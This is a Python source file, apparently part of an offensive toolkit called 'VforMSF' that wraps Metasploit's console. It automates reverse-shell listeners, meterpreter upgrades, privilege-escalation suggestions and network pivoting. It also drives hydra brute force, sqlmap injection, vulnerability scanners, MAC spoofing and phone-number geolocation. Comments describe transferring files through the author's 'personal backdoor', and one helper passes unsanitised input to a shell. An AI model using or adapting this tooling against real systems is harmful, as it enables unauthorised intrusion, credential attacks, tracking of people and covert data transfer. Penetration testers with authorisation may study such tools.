            save_output = input_with_backspace("save output with filename (Press enter for N/A): ")
            if save_output:
                filename = save_output.strip()

            target_links = []

            def extract_links_from(url):
                try:
                    response = requests.get(url, allow_redirects=True)
                except requests.exceptions.RequestException as e:
                    print("[-] Failed to retrieve links from", url, ":", e)
                    return []

                # Extract all links from the page
                return re.findall('(?:href|src)="(.*?)"', response.content.decode(errors="ignore"))

            def crawl(url, depth, file):
                base_url = urllib.parse.urljoin(url, "/")
                if url in target_links:
                    return
                target_links.append(url)
                print(url)
                if file:
                    file.write(url + "\n")
                if depth > 1:
                    href_links = extract_links_from(url)
                    for link in href_links:
                        link = urllib.parse.urljoin(url, link)
                        if "#" in link:
                            link = link.split("#")[0]
                        if target_url in link and link not in target_links and base_url in link:
                            crawl(link, depth=depth-1, file=file)

            if filename:
                print("[+] Crawling", target_url, "up to depth", depth)
                with open(filename, "w") as file:
                    file.write("Crawling " + target_url + " up to depth " + str(depth) + "\n")
                    crawl(target_url, depth=depth, file=file)
                    file.write("Crawling complete!")
                print("[+] Crawling complete!")
            else:
                print("\n[+] Crawling", target_url, "up to depth", depth)
                crawl(target_url, depth=depth, file=None)
                print("\n[+] Crawling complete!")

        except KeyboardInterrupt:
            print("\nKeyboard interrupt detected. Exiting...\n")
            return

def input_with_backspace(prompt=''):
    readline.set_startup_hook(lambda: readline.insert_text(''))
    try:
        user_input = input(prompt)
        # Removing semicolon character from the input
        user_input = user_input.replace(';', '')
        return user_input
    finally:
        readline.set_startup_hook()

# Validating user input to ensure the IP addresses are in the correct format and are valid IP addresses.
def validate_ip_address(ip):
    if '/' in ip:
        ip, mask = ip.split('/')
        if not validate_ip_address(ip):
            return False
        if not re.match(r"\d{1,2}$", mask):
            return False
    else:
        if not re.match(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", ip):
            return False
        try:
            socket.inet_aton(ip)
            return True
        except socket.error:
            return False
    return True

def is_alive(ip):
    try:
        subprocess.check_output(["ping", "-c", "1", "-W", "1", ip])
        return True
    except subprocess.CalledProcessError:
        return False

def arp_scan(ip):
    try:
        scapy.arping(ip)
    except Exception as e:
        raise e
        
def arp_function():
    print("**must be root**\n")
    while True:  # Infinite loop to keep asking for IP addresses or networks until the user exits
        try:
            ips = input_with_backspace("IP addresses or network to scan (Press enter to exit)> ")
            if not ips:
                return  # If the user presses Enter without entering an IP address, exit the loop

            if validate_ip_address(ips):
                try:
                    arp_scan(ips)
                    print()
                except Exception as e:
                    print(f"[-] Error occurred during scan: {e}")
                    print()
            else:
                print("[-] Invalid IP address or network entered. Please try again.")
                continue

        except KeyboardInterrupt:
            print("\nKeyboard interrupt detected. Exiting...\n")
            return
    
def change_mac(adapter, address):
    subprocess.call(["ifconfig", adapter, "down"])
    subprocess.call(["ifconfig", adapter, "hw", "ether", address])
    subprocess.call(["ifconfig", adapter, "up"])
    print("[+] Changing MAC address for " + adapter + " to " + address)

def get_current_mac(adapter):
    try:
        ifconfig_result = subprocess.check_output(["ifconfig", adapter])
        mac_address_search_result = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", str(ifconfig_result))
        if mac_address_search_result:
            return mac_address_search_result.group(0)
    except subprocess.CalledProcessError:
        pass
    return None

def mac_change():
    while True:  # Infinite loop to keep asking for adapters to change until the user exits
        try:
            adapter, address = get_input()
            if not adapter:
                return  # If the user presses Enter without entering an adapter, exit the loop

            current_mac = get_current_mac(adapter)
            if current_mac is None:
                print("[-] Could not read MAC Address for adapter " + adapter + " (adapter does not exist)")
                continue

            change_mac(adapter, address)
            current_mac = get_current_mac(adapter)
            if current_mac == address:
                print("[+] MAC address was successfully changed to " + current_mac + "\n")
            else:
                print("[-] MAC address did not get changed.\n")

        except KeyboardInterrupt:
            print("\nKeyboard interrupt detected. Exiting...\n")
            return

def get_input():
    print("**must be root**\n")
    try:
        while True:
            adapter = input_with_backspace("Enter the adapter name you want to change (Press enter to exit)> ")
            if not adapter:
                break

            # Check if the entered adapter name exists on the system (Linux/macOS)
            if not is_valid_adapter(adapter):
                print(f"[-] Adapter '{adapter}' not found. Please enter a valid adapter name.")
                continue

            address = input_with_backspace("Enter the new MAC address (Press enter for random): ")
            if not address:
                address = "{:02x}:{:02x}:{:02x}:{:02x}:{:02x}:{:02x}".format(
                    random.randint(10, 48) * 2,
                    random.randint(10, 99),
                    random.randint(10, 99),
                    random.randint(10, 99),
                    random.randint(10, 99),
                    random.randint(10, 99)
                )
                print("[+] Generated random MAC address: " + address)

            while not re.match(r"([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})", address):
                print("[-] MAC addresses cannot have an odd first digit and must follow the XX:XX:XX:XX:XX:XX format.")
                address = input_with_backspace("Enter the new MAC address (Press enter for random): ")
                if not address:
                    address = "{:02x}:{:02x}:{:02x}:{:02x}:{:02x}:{:02x}".format(
                        random.randint(10, 48) * 2,
                        random.randint(10, 99),
                        random.randint(10, 99),
                        random.randint(10, 99),
                        random.randint(10, 99),
                        random.randint(10, 99)
                    )
                    print("[+] Generated random MAC address: " + address)
            return adapter, address

    except KeyboardInterrupt:
        print("\nKeyboard interrupt detected. Exiting...\n")
        return

def is_valid_adapter(adapter_name):
    # Execute the appropriate command to check if the adapter exists on Linux
    try:
        subprocess.check_output(f"ifconfig -a {adapter_name}", shell=True, text=True)
        return True
    except subprocess.CalledProcessError:
        return False

def start_msf():
    try:
        # Start the postgresql service
        print("[+] Starting postgresql service...")
        subprocess.run(["sudo", "systemctl", "start", "postgresql.service"], check=True)
        
        # Initialize the Metasploit Framework database
        print("[+] Initializing Metasploit Framework database (msfdb)...")
        subprocess.run(["sudo", "msfdb", "init"], check=True)
        
    except subprocess.CalledProcessError as e:
        print(f"[-] An error occurred while starting msfconsole.\n")
        print(f"{e}")
    except Exception as e:
        print(f"[-] An error occurred while starting msfconsole.\n")
        print(f"{e}")
        
def strip_ansi_sequences(text):
    ansi_escape_pattern = re.compile(r'\x1B\[[0-?]*[ -/]*[@-~]')
    return ansi_escape_pattern.sub('', text)
        
def main():
    # Set up initial pseudoterminal and msfconsole process
    master, slave = pty.openpty()
    pid = os.fork()

    if pid == 0:  # Child process
        os.close(master)
        os.dup2(slave, 0)
        os.dup2(slave, 1)
        os.dup2(slave, 2)

        # Execute the msfconsole process
        os.execlp("msfconsole", "msfconsole", "-q")  # Start msfconsole quietly
    else:  # Parent process
        os.close(slave)
        # Initialize variables
        first_launch = True
        defaultset = False
        inmodule = False
        modulepattern = r'\b(exploit|auxiliary|post|payload|encoder|nop|evasion)\((.*?)\)'
        ligoloup = False
        try:
            while True:
                # Wait for data to become available on the master end of the PTY or stdin
                rlist, _, _ = select.select([sys.stdin, master], [], [])
                for r in rlist:
                    if r == master:
                        output = os.read(master, 1024).decode()
                        sys.stdout.write(output)
                        sys.stdout.flush()
                        output = strip_ansi_sequences(output)

                        # Check if the output indicates that msfconsole is ready
                        if first_launch:
                            load_metasploit_params()
                            print("[+] Successfully loaded VforMSF extensions")
                            first_launch = False
                            
                        if re.search(modulepattern, output):
                            inmodule = True
                        else:
                            inmodule = False

                    elif r == sys.stdin:
                        user_input = sys.stdin.readline()
                        if user_input.lower().strip() == "exit":
                            os.write(master, b"exit\n")
                            sys.exit()
                            if ligoloup:
                               subprocess.call(['sudo ip link delete ligolo'])

                        elif user_input.lower().startswith("use "):
                            os.write(master, user_input.encode())
                            os.write(master, f"show options\n".encode())
                               
                        elif user_input.lower().startswith("set config"):
                           match = re.search(modulepattern, output)
                           if match:
                               module_name = match.group(2)
                               os.write(master, f"back\n".encode())
                               send_metasploit_commands(master)
                               os.write(master, f"use {module_name}\n".encode())
                               defaultset = True
                           else:
                               send_metasploit_commands(master)
                               defaultset = True


                        elif user_input.lower().startswith("update config"):
                            update_metasploit_params()

                        elif user_input.lower().startswith("show config"):
                            print_current_defaults()

                        elif user_input.lower().startswith("load config"):
                            load_metasploit_params()

                        elif user_input.lower().startswith("save config"):
                            save_metasploit_params()

                        elif user_input.lower().startswith("upgrade"):
                            session = int(input("session: "))
                            os.write(master, f"use post/multi/manage/shell_to_meterpreter\n".encode())
                            os.write(master, f"set session {session}\n".encode())
                            os.write(master, f"exploit\n".encode())

                        elif user_input.lower().startswith("listen"):
                            parts = user_input.split()
                            if len(parts) >= 3:
                                msfport = parts[1].strip()
                                job = parts[2].strip()
                                os.write(master, f"set lport {msfport}\n".encode())
                                os.write(master, f"use exploit/multi/handler\n".encode())
                                if defaultset:
                                    os.write(master, f"exploit -j\n".encode())
                                else:
                                    os.write(master, f"show options\n".encode())
                            else:
                                msfport = parts[1].strip()
                                os.write(master, f"set lport {msfport}\n".encode())
                                os.write(master, f"use exploit/multi/handler\n".encode())
                                if defaultset:
                                    os.write(master, f"exploit\n".encode())
                                else:
                                    os.write(master, f"show options\n".encode())

                        elif user_input.lower().startswith("suggester"):
                            session = int(input("session: "))
                            os.write(master, f"use post/multi/recon/local_exploit_suggester\n".encode())
                            os.write(master, f"set session {session}\n".encode())
                            os.write(master, f"exploit\n".encode())

                        elif user_input.lower().startswith("route"):
                            session = int(input("session: "))
                            os.write(master, f"use post/multi/manage/autoroute\n".encode())
                            os.write(master, f"set session {session}\n".encode())
                            os.write(master, f"exploit\n".encode())

                        elif user_input.lower().startswith("help"):
                            if not re.search(r"msf", output): #for my reverse shell, comment out if it bothers you
                                os.write(master, b"shelp\n")
                            else:
                                print("[-] Please specify *msfhelp* or *vhelp*")

                        elif user_input.lower().startswith("msfhelp"):
                            os.write(master, b"help\n")

                        elif user_input.lower().startswith("vhelp"):
                            print("\n**CURRENT COMMAND & AVAILABLE MODULES:**\n")

                            print("**SELF COMMANDS:**")
                            print("  -vbanner *Displays our awesome banner*")
                            print("  -vhelp *Display this list. More commands to come in future updates*")
                            print("  -exit *Ends the program*")
                            print("  -clear *clears the screen*")
                            print()

                            print("**UTILITY COMMANDS:**")
                            print("  -bash *Enters a bash terminal. The script is still running. Use exit to return*")
                            print("  -chmac *Changes your MAC address. (Needs Root)*")
                            print("  -locate *full phone number* *sends a very approximate location for the provided phone number*")
                            print()

                            print("**NETWORK DISCOVERY COMMANDS:**")
                            print("  -arp *Does an ARP scan to discover hosts on the local network. (Needs root)*")
                            print("  -ping *Calls nmap to discover hosts using a ping scan*")
                            print("  -scan *Calls nmap preform a scan of your choosing*")
                            print()

                            print("**WEB APPLICATION DISCOVERY COMMANDS:**")
                            print("  -spider *Crawls the HTML of a target website for interesting endpoints such as .js*")
                            print("  -dbust *Performs directory busting utilizing dirb to look for hidden directories on a target website.*")
                            print("  -fuzz *Utilizes ffuf to quickly enumerate endpoints on a target website.*")
                            print("  -sbust *Performs quick subdomain busting utilizing Sublist3r to look for subdomains on a target website.*\n ")
                            print("  -sbrute *Performs subdomain busting utilizing subbrute with a wordlist to look for subdomains on a target website.*")
                            print()

                            print("**VULNERABILITY SCANNING COMMANDS:**")
                            print("  -vulnwebzap *Calls owasp-zap for web app vulnerability scanning.*")
                            print("  -vulnwebnikto *Calls nikto for web app vulnerability scanning.*")
                            print("  -vulnport *Calls nmap vulners for port based vulnerability scanning.*")
                            print()

                            print("**EXPLOITATION MODULES:**")
                            print("  -login' *Utilizes hydra to preform a brute force attack on a login point.*")
                            print("  -sqli *Utilizes sqlmap to attempt sql injection on a target website.*")
                            print()

                            print("**METASPLOIT ADDITIONS AND AUTOMATION:**")
                            print("  -listen *port* *Automates exploit/multi/handler*")
                            print("  -route *Automates post/multi/manage/autoroute*")
                            print("  -suggester *Automates post/multi/recon/local_exploit_suggester*")
                            print("  -upgrade *Automates post/multi/manage/shell_to_meterpreter*")
                            print("  -pivot *Utilizes ligolo to set up a route into internal network for non-meterpreter shells*")
                            print("  -show config *displays the current default values*")
                            print("  -update config *updates the default values to save or set*")
                            print("  -load config *loads the saved default values from a file*")
                            print("  -save config *save the current default values to a file*")
                            print("  -set config *enters the default values into metasploit*")
                            print()
                            
                        # If user enters the 'locate' command, geolocate a phone number
                        elif user_input.lower().startswith("clear "):
                            try:
                                os.system('clear')
                            except Exception as e:
                                print(f"[-] Error occurred during scan: {e}")

                        # If user enters the 'locate' command, geolocate a phone number
                        elif user_input.lower().startswith("locate "):
                            phone_number = user_input.split("locate ")[1]
                            try:
                                print("*sends a very approximate location for the provided phone number*")
                                init()
                                locate(f"+{phone_number}")
                            except Exception as e:
                                print(f"[-] Error occurred during scan: {e}")

                        # If user enters the 'sqli' command, use sqlmap to attempt sql injection
                        elif user_input.lower().startswith("sqli"):
                            print("*Utilizes sqlmap to attempt sql injection on a target website.*")
                            try:
                                sqli()
                            except Exception as e:
                                print(f"[-] Error occurred during scan: {e}")

                        # If user enters the 'fuzz' command, use ffuf to enumerate endpoints
                        elif user_input.lower().startswith("fuzz"):
                            print("*Utilizes ffuf to quickly enumerate endpoints on a target website.*")
                            try:
                                fuzz()
                            except Exception as e:
                                print(f"[-] Error occurred during scan: {e}")

                        # If user enters the 'login' command, utilize hydra to brute force an endpoint
                        elif user_input.lower().startswith("login"):
                            print("*Utilizes hydra to preform a brute force attack on a login point.*")
                            try:
                                login()
                            except Exception as e:
                                print(f"[-] Error occurred during scan: {e}")

                        # If user enters the 'scan' command, prompt for IP address and run the scan
                        elif user_input.lower().startswith("scan"):
                            try:
                                print("*Calls nmap preform a scan of your choosing*")
                                scan()
                            except Exception as e:
                                print(f"[-] Error occurred during scan: {e}")

                        # If user enters the 'sbrute' command, utilize subbrute to find subdomains using a 140k wordlist
                        elif user_input.lower().startswith("sbrute"):
                            print("*Performs subdomain busting utilizing subbrute with a wordlist to look for subdomains on a target website.*")
                            print("\nThis scan typically takes 25-40 minutes.\n")
                            try:
                                sbrute()
                            except Exception as e:
                                print(f"[-] Error occurred during scan: {e}")

                        # If user enters the 'sbust' command, utilize sublister to find subdomains
                        elif user_input.lower().startswith("sbust"):
                            print("*Performs quick subdomain busting utilizing Sublist3r to look for subdomains on a target website.*")
                            try:
                                sbust()
                            except Exception as e:
                                print(f"[-] Error occurred during scan: {e}")

                        # If user enters the 'vulnwebzap' command, utilize owasp-zap to preform a vulnerability scan
                        elif user_input.lower().startswith("vulnwebzap"):
                            print("*Calls owasp-zap for web app vulnerability scanning.*")
                            print("\nThis scan typically takes 10-60 minutes depending on the complexity of the endpoint.\n")
                            try:
                                vulnwebzap()
                            except Exception as e:
                                print(f"[-] Error occurred during scan: {e}")

                        # If user enters the 'vulnwebnikto' command, utilize nikto to preform a vulnerability scan
                        elif user_input.lower().startswith("vulnwebnikto"):
                            print("*Calls nikto for web app vulnerability scanning.*")
                            print("\nThis scan typically takes 5-15 minutes depending on the complexity of the endpoint.\n")
                            try:
                                vulnwebnikto()
                            except Exception as e:
                                print(f"[-] Error occurred during scan: {e}")

                        # If user enters the 'vulnport' command, utilize nmap to preform a vulnerability scan
                        elif user_input.lower().startswith("vulnport"):
                            print("*Calls nmap vulners for port based vulnerability scanning.*")
                            print("\nThis scan typically takes 5-10 minutes per host.")
                            try:
                                vulnport()
                            except Exception as e:
                                print(f"[-] Error occurred during scan: {e}")

                        # If user enters the 'dbust' command, enter into the directory busting module that utilizes dirb
                        elif user_input.lower().startswith("dbust"):
                            print("*Performs directory busting utilizing dirb to look for hidden directories on a target website.*")
                            print("\nDefault wordlist typically takes 10-15 minutes to run through per directory\n")
                            try:
                                dbust()
                            except Exception as e:
                                print(f"[-] Error occurred during scan: {e}")

                        # If user enters the 'spider' command, enter into the url crawling module
                        elif user_input.lower().startswith("spider"):
                            try:
                                print("*Crawls the HTML of a target website for interesting endpoints such as .js*")
                                spider()
                            except Exception as e:
                                print(f"[-] Error occurred during scan: {e}")

                        # If user enters the 'ping' command, prompt for IP address and run the scan
                        elif user_input.lower().startswith("ping"):
                            try:
                                print("*Calls nmap to discover hosts using a ping scan*")
                                ping()
                            except Exception as e:
                                print(f"[-] Error occurred during scan: {e}")

                        # If user enters the 'arp' command, prompt for IP address and run the scan
                        elif user_input.lower().startswith("arp"):
                            try:
                                print("*Does an ARP scan to discover hosts on the local network. (Needs root)*")
                                arp_function()
                            except Exception as e:
                                print(f"[-] Error occurred during scan: {e}")

                        # If user enters the 'chmac' command, show adapters and enter the change mac address module
                        elif user_input.lower().startswith("chmac"):
                            try:
                                print("*Changes your MAC address. (Needs Root)*")
                                print()
                                subprocess.call(['ifconfig'])
                                print()
                                mac_change()
                            except Exception as e:
                                print(f"[-] Error occurred: {e}")

                        #If user enters the 'bash' command, spawn a bash terminal
                        elif user_input.lower().startswith("bash"):
                            # Spawn a new shell
                            try:
                                subprocess.call(['/bin/bash'])
                            except Exception as e:
                                print(f"[-] Error occurred: {e}")
        
                        elif user_input.lower().startswith("vbanner"):
                            try:
                                banner()
                            except Exception as e:
                                print(f"[-]Error occurred: {e}")

                        elif user_input.lower().startswith("vdownload"):
                        #This interacts with my personal backdoor so I do not have to use multihandlers functionality
                        #comment it out if it bothers you
                            try:
                                os.write(master, user_input.encode())
                                parts = user_input.split(" ", 1)
                                filename = parts[1].strip()
                                # Call the receive_file function
                                receive_file(filename)
                            except Exception as e:
                                print(f"[-] Error occurred: {e}")
                                    
                        elif user_input.lower().startswith("vupload"):
                        #This interacts with my personal backdoor so I do not have to use multihandlers functionality
                        #comment it out if it bothers you
                            try:
                                os.write(master, user_input.encode())
                                parts = user_input.split(" ", 1)
                                filename = parts[1].strip()
                                # Call the send_file function to initiate the upload
                                send_file(filename)
                            except Exception as e:
                                print(f"[-] Error occurred: {e}")
                                    
                        elif user_input.lower().startswith("pivot"):
                            print("*Utilizes ligolo to set up a tunnel into internal network*")
                            print("[+] See https://github.com/Nicocha30/ligolo-ng for the required files and information\n")
                            if not re.search(r"msf", output):
                                try:
                                    route(master)
                                    ligoloup = True
                                except Exception as e:
                                    print(f"[-] Error occurred: {e}")
                            else:
                                print(f"[-] Non interactive state detected. Please enter an active session")
                        else:
                            os.write(master, user_input.encode())
        finally:
            # Clean up
            os.close(master)
            os.kill(pid, signal.SIGTERM)

if __name__ == "__main__":
    # Execute initial commands to start services
    start_msf()
    main()

